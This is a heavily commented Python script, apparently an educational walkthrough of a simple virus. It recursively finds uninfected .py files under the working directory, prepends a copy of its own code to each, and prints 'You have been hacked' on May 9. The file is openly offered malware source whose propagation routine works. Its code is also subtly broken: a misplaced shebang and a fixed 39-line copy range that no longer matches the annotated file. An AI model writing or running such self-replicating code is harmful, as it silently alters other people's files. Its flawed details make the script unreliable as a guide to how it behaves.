# This is the shebang and allows the script to be run from the command line directly
# There's no main gate in this script so it'll run regardless of how it is called.
#!/usr/bin/python3

# Library imports. OS for operating system commands. Datetime is self evident.
import os
import datetime

# A constant variable with the string "VIRUS".
SIGNATURE = "VIRUS"

# FUNCTION DECLARATIONS
# Declares locate function, takes on an absolute path as its argument (either working directory or where the location the script was executed from)
def locate(path):

    # Creates an empty list for located files
    files_targeted = []

    # Uses os.listdir on the passed argument to create a python list of files and directories
    filelist = os.listdir(path)

    # Iterates through filelist with the variable fname for each index item in filelist.
    for fname in filelist:
        # If statements that checks if an entry in the filelist is a directory
        if os.path.isdir(path+"/"+fname):
            # If the entry is a directory, it recursively calls this location function using absolute path of that directory and adds it to the files_targeted list.

            # .extend is used here because the locate function returns a list. Extend adds each individual item of that returned list as an individual item into this files_targeted list.  (Append would add the returned list as a single entry in the list, created a nested list)
            files_targeted.extend(locate(path+"/"+fname))

        # If it isn't a directory (and therefore a file), this checks to see if the file has a ".py" extension
        elif fname[-3:] == ".py":
            # Creates a variable infected set to a FALSE boolean
            infected = False
            # Loop that iterates and opens Python files
            for line in open(path+"/"+fname):
                # Checks for the VIRUS signature
                if SIGNATURE in line:
                    # If the signature is found, then it sets the infected variable to TRUE
                    infected = True
                    # Breaks the loop.
                    break
            # Checks if the file isn't infected (as determined by the for loop)
            if infected == False:
                # Appends the absolute path of this Python file to the files_targeted list
                files_targeted.append(path+"/"+fname)
    # Returns the list with the identified python files to where it was called.
    return files_targeted

# Declares infect function to infect the targetted files from the location function
def infect(files_targeted):
    # Opens THIS script file
    # __file__ is a special Python attribute that indicates the currently running script file
    virus = open(os.path.abspath(__file__))

    # Creates an empty string variable
    virusstring = ""
    # Loops through the lines of the virus script and keeps track of each line number
    for i, line in enumerate(virus):
        # Checks if the line index is between 0 and 38
        if 0 <= i < 39:
            # If it is between 0 and 38, adds it to the string variable virusstring
            # In the original virus file, this would be the majority of the code but is missing the critical invocations and the detonate function.
            virusstring += line
    # Closes the virus script file
    virus.close

    # Loops through the list of targetted files arg that was passed to this function
    for fname in files_targeted:
        # Opens a file from the list
        f = open(fname)

        # Reads the content of the file and places it in a variable
        temp = f.read()

        # Closes the file
        f.close()

        # Opens the file in write mode
        f = open(fname, "w")

        # Adds the virus string to the file beginning of the file and then adds the original contents of the file afterwards.
        f.write(virusstring + temp)

        # Closes the file
        f.close()

# Defines a function called 'detonate' to execute the malicious code injected into the scripts
def detonate():
    # Checks if the date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Prints a message
        print("You have been hacked")


# FUNCTIONS INVOKED
# files_targeted variable saves the return from the invoked location function, which was passed the absolute path of the current working directory -- either from where the script was executed or the Python is script is located.
files_targeted = locate(os.path.abspath(""))

# Passes the files_targeted variable as argument to infect function
infect(files_targeted)

# Executes the detonate function
detonate()
